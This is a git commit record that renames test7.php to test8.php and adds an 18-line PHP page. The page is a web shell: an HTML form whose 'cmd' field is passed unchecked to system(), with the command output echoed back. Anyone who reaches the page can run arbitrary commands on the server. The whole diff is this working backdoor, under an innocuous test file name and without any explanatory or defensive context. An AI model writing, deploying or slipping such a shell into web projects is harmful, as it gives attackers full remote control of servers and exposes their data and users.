125f68adf9d4b605e9dac101a646506b2bc89e03
Qeisi <84850150+Qeisi@users.noreply.github.com>
2021-08-28 21:39:15 +0300

    Update and rename test7.php to test8.php

---
+++ test8.php
@@ -0,0 +1,18 @@
+<!DOCTYPE html>
+
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
